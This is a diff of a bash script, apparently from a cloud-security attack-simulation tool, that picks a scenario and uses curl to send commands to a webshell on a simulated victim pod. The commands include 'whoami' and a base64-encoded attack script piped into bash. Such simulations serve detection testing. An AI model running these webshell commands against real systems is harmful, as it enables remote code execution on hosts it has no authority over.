@@ -1,6 +1,10 @@
 #!/bin/bash
+
+# Copyright (c) Microsoft Corporation.
+# Licensed under the MIT License.
+
 sleep 10
-echo "started at `date`"
+echo "Started at `date`"
 echo " "
 case $SCENARIO in
     recon)
@@ -14,18 +18,20 @@ case $SCENARIO in
         ;;
     crypto)
         attack_script=crypto.sh
-        python3 -m http.server 80 &
+        python3 -m http.server 80 > /dev/null 2>&1 &
+        sleep 2
         ;;
     all)
         attack_script=all-scenarios.sh
-        python3 -m http.server 80 &
+        python3 -m http.server 80 > /dev/null 2>&1 &
+        sleep 2
         ;;
     webshell)
         echo "--- Webshell ---"
-        echo "sending command \"whoami\" to victim"
-        curl -Gs --data-urlencode "cmd=whoami" "http://$NAME-victim/ws.php"
+        echo "Sending command \"whoami\" to victim"
+        curl -Gs --data-urlencode "cmd=whoami" "http://mdc-simulation-victim/ws.php" | sed '/<!--/,/-->/d'
         echo " "
-        echo "--- simulation completed ---"
+        echo "--- Simulation completed ---"
         exit
         ;;
     *)
@@ -33,9 +39,9 @@ case $SCENARIO in
         exit
         ;;
     esac
-script_b64=`cat $attack_script | base64 -w0`
+script_b64=$(cat $attack_script | base64 -w0)
 echo "--- Webshell ---"
-echo "sending payload request to the victim pod"
+echo "Sending payload request to the victim pod"
 echo " "
-curl -Gs --data-urlencode "cmd=echo $script_b64| base64 -d| bash" "http://$NAME-victim/ws.php"
-echo "--- simulation completed ---"
+curl -Gs --data-urlencode "cmd=echo $script_b64| base64 -d| bash" "http://mdc-simulation-victim/ws.php"  | sed '/<!--/,/-->/d'
+echo "--- Simulation completed ---"
